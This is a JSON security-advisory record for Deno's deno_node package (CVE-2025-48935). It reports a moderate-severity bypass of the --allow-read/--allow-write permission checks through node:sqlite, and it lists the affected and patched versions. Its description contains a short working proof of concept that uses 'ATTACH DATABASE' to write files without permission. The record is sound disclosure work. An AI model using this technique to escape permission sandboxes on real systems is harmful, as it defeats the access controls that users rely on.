{
  "Severity": "MODERATE",
  "UpdatedAt": "2025-06-04T21:22:28Z",
  "Package": {
    "Ecosystem": "RUST",
    "Name": "deno_node"
  },
  "Advisory": {
    "DatabaseId": 297550,
    "Id": "GSA_kwCzR0hTQS04dnhqLTRjcGgtYzU5Ns4ABIpO",
    "GhsaId": "GHSA-8vxj-4cph-c596",
    "References": [
      {
        "Url": "https://github.com/denoland/deno/security/advisories/GHSA-8vxj-4cph-c596"
      },
      {
        "Url": "https://github.com/denoland/deno/commit/31a97803995bd94629528ba841b2418d3ca01860"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-48935"
      },
      {
        "Url": "https://github.com/advisories/GHSA-8vxj-4cph-c596"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-8vxj-4cph-c596"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-48935"
      }
    ],
    "Description": "## Summary\n\nIt is possible to bypass Deno's read/write permission checks by using `ATTACH DATABASE` statement.\n\n## PoC\n\n```js\n// poc.js\nimport { DatabaseSync } from \"node:sqlite\"\n\nconst db = new DatabaseSync(\":memory:\");\ndb.exec(\"ATTACH DATABASE 'test.db' as test;\");\n\ndb.exec(\"CREATE TABLE test.test (id INTEGER PRIMARY KEY, name TEXT);\");\n```\n\n```\n$ deno poc.js\n```",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-06-04T21:22:27Z",
    "Severity": "MODERATE",
    "Summary": "Deno has --allow-read / --allow-write permission bypass in `node:sqlite`",
    "UpdatedAt": "2025-07-02T18:32:18Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 9.1,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "0.134.0"
      },
      "VulnerableVersionRange": "\u003e= 0.129.0, \u003c 0.134.0"
    }
  ]
}